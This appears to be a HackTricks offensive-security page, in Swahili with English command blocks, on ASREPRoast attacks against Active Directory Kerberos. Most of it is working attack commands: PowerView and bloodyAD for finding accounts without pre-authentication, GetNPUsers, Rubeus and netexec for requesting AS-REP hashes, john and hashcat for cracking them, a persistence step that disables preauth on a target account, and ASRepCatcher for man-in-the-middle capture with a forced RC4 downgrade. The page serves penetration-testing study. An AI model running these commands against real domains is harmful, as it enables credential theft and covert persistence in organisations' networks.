# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **Kerberos pre-authentication required attribute**. Kwa kifupi, udhaifu huu unamruhusu mshambuliaji kuomba uthibitisho kwa mtumiaji kutoka kwa Domain Controller (DC) bila hitaji la nenosiri la mtumiaji. DC kisha hutoa ujumbe uliosimbwa kwa kitufe kinachotokana na nenosiri la mtumiaji, ambao mshambuliaji anaweza kujaribu kuvunja offline ili kugundua nenosiri la mtumiaji.

Mahitaji makuu kwa shambulio hili ni:

- **Lack of Kerberos pre-authentication**: Watumiaji waliolengwa hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
- **Connection to the Domain Controller (DC)**: Wanaomshambulia wanahitaji ufikiaji wa Domain Controller (DC) ili kutuma maombi na kupokea ujumbe uliosimbwa.
- **Optional domain account**: Kuwa na akaunti ya domain kunawawezesha wanaomshambulia kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia maswali ya LDAP. Bila akaunti kama hiyo, wanaomshambulia lazima wabashiri majina ya watumiaji.

#### Kukusanya watumiaji walio hatarini (inahitaji taarifa za kuingia za domain)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting na Rubeus itatengeneza 4768 yenye encryption type ya 0x17 na preauth type ya 0.

#### Mifupisho ya haraka (Linux)

- Kwanza orodhesha malengo yanayowezekana (kwa mfano, kutoka leaked build paths) kwa Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Chukua AS-REP ya mtumiaji mmoja hata akiwa na password **blank** kwa kutumia `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec pia inaonyesha LDAP signing/channel binding posture).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – inagundua kiotomatiki **-m 18200** (etype 23) kwa AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika properties):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

Mshambulizi anaweza kutumia nafasi ya man-in-the-middle kukamata vifurushi vya AS-REP wanapopita kwenye mtandao bila kutegemea Kerberos pre-authentication kuwa imezimwa. Kwa hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatuwezesha kufanya hivyo. Zaidi ya hayo, zana inawalazimisha kompyuta za wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
